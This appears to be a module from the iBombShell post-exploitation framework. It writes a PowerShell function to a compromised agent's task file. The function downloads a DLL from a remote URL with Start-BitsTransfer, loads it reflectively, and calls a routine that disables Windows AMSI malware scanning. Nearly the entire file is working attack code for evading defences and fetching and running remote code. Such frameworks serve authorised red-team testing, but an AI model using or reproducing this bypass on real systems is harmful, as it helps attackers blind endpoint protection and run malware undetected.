from termcolor import colored, cprint
from module import Module
from warrior_check import exist_warrior


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "amsi-file",
                       "Description": "amsi bypass with dll in disk",
                       "Author": "@pablogonzalezpe, @josueencinar"
                       }

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "dll": ["https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/data/files/amsi-surprise.dll", "dll url", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        if exist_warrior(self.args["warrior"]):
            function = """function amsi-dlldisk {
                  param(
                [Parameter(Mandatory)]
                [string] $dll
                )
                $admin_privileges = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
		        if (-not $admin_privileges) { return "It is necessary to have admin permissions"}
                $output = $pwd
                try{    
                    Start-BitsTransfer -Source $dll -Destination $output
                    [Reflection.Assembly]::Load([IO.File]::ReadAllBytes($output.Path+"\\amsi-surprise.dll"))
                } catch {
                    
                }
                $res = [Bypass.AMSI]::Disable()
                if ($res -eq 0) {
                    return 'Patched'
                }else {
                    return 'No Patched'
                }
            }
            """

            function += 'amsi-dlldisk -dll ' + self.args["dll"]

            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
                f.write(function)

            cprint ('[+] Done!', 'green')
        else:
            cprint ('[!] Failed... Warrior don´t found', 'red')